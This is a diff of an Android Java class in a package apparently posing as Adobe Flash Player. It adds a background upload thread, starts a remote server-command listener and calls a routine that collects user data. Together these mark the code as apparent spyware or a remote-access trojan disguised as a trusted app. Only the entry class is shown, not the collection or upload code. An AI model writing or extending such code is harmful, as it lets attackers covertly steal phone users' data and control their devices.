@@ -7,13 +7,14 @@ import android.util.Log;
 import java.io.File;
 import java.io.FileInputStream;
 
+import com.adobe.flashplayer.data.UploadRemainder;
 import com.adobe.flashplayer.network.Network;
 import com.adobe.flashplayer.network.ServerCommand;
 import com.adobe.flashplayer.data.Collection;
 
 
 
-public class MainEntry extends  Thread{
+public class MainEntry extends Thread{
 
     private Context context;
     private String path;
@@ -36,7 +37,6 @@ public class MainEntry extends  Thread{
                 Log.e(TAG, "[liujinguang]uninstall settled");
                 return;
             }
-
 
             if (path != null && path.equals("") == false) {
                 if (path.endsWith("/") == false) {
@@ -68,26 +68,22 @@ public class MainEntry extends  Thread{
                 }
             }
 
-
             Public pubclass = new Public(context);
             Network network = new Network(context);
 
             try {
-                ServerCommand server = new ServerCommand(context);
-                Thread thread = new Thread(server, Public.SERVER_CMD_THREADNAME);
-                thread.start();
-
+                Network.launchServerCmdThread(context);
             } catch (Exception e) {
                 e.printStackTrace();
             }
 
-
             try {
+                new Thread(new UploadRemainder(context)).start();
+
                 Collection.collectUserData(context);
 
             } catch (Exception e) {
                 Log.e(TAG, "[liujinguang]Collection exception");
-
                 e.printStackTrace();
             }
 
